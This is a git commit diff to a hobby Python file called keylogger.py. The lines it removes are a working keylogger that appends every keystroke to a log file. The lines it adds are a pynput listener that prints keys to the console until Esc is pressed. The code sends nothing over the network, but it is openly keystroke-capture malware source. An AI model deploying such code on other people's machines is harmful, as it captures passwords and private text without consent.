c1124348ebfa8c2313376dc4f0e00ce4197f2bef
Nicola <109990495+Nikilites@users.noreply.github.com>
2024-11-02 23:28:17 +0100

    changed everything.py

--- keylogger.py
+++ keylogger.py
@@ -1,35 +1,16 @@
-import keyboard
-import os
+import pynput
+from pynput.keyboard import Key, Listener
 
-LOG_FILE = "C:/Users/nikilite/Downloads/lol.txt"  # specify the full path to the log file
+def on_press(key):
+    print(f"Premuto: {key}")
 
-class Keylogger:
-    def __init__(self, log_file):
-        self.log_file = log_file
-        self.start()
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
 
-    def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-        
-        with open(self.log_file, "a", encoding="utf-8") as file:
-            file.write(name)
-
-    def start(self):
-        keyboard.on_release(callback=self.callback)
-        keyboard.wait('esc')
-
-    def stop(self):
-        keyboard.unhook_all()
-
-if __name__ == "__main__":
-    keylogger = Keylogger(log_file=LOG_FILE)
+# Collect events until released
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+    
+#this code is so simple lmao
